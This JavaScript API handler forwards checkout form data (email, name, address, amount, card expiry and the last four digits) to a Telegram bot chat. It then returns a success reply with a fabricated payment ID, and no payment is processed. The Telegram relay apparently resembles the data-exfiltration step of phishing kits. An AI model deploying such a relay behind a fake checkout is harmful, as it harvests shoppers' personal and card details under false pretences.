const axios = require('axios');

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  // Mask sensitive data
  const cardLast4 = req.body.card_number?.slice(-4) || '';
  const maskedCard = `**** **** **** ${cardLast4}`;

  const message = `
💳 *New Payment Received* 💳
--------------------------------
📧 *Email*: ${req.body.email}
👤 *Name*: ${req.body.full_name}
🌍 *Country*: ${req.body.country}
🏠 *Address*: ${req.body.address}
🏙️ *City*: ${req.body.city}
📍 *Province*: ${req.body.province}
📬 *Postal Code*: ${req.body.postal_code}
💰 *Amount*: ${req.body.currency} ${req.body.amount}
💳 *Card*: \`${maskedCard}\`
📅 *Expiry*: ${req.body.card_expiry}
🔒 *CVC*: \`***\`
--------------------------------
⏰ *Time*: ${new Date().toISOString()}
  `;

  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }
    );

    res.status(200).json({
      ok: true,
      payment_id: Date.now(),
      message: 'Payment data sent to Telegram.'
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ ok: false, error: 'Telegram error' });
  }
}